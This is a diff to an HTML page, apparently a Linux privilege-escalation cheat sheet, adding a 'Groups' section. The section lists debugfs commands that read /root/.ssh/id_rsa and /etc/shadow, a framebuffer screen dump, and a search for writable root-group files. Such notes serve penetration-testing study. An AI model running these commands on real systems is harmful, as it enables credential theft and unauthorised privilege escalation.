@@ -5403,6 +5403,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#groups" class="md-nav__link">
+    Groups
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#process" class="md-nav__link">
     Process
   </a>
@@ -7869,6 +7876,13 @@
 </li>
       
         <li class="md-nav__item">
+  <a href="#groups" class="md-nav__link">
+    Groups
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
   <a href="#process" class="md-nav__link">
     Process
   </a>
@@ -8068,6 +8082,25 @@
 <li>IFS Exploit</li>
 <li>LD_PRELOAD Exploit</li>
 <li>Symlinks</li>
+</ul>
+</li>
+</ul>
+<h2 id="groups">Groups<a class="headerlink" href="#groups" title="Permanent link">&para;</a></h2>
+<ul>
+<li>shadow - can read /etc/shadow</li>
+<li>disk - raw access to files <ul>
+<li>debugfs /dev/sda1</li>
+<li>debugfs: cat /root/.ssh/id_rsa</li>
+<li>debugfs: cat /etc/shadow</li>
+</ul>
+</li>
+<li>video - access to framebuffer<ul>
+<li>cat /dev/fb0 &gt; /tmp/screen.raw</li>
+<li>cat /sys/class/graphics/fb0/virtual_size</li>
+</ul>
+</li>
+<li>root<ul>
+<li>find / -group root -perm -g=w 2&gt;/dev/null</li>
 </ul>
 </li>
 </ul>
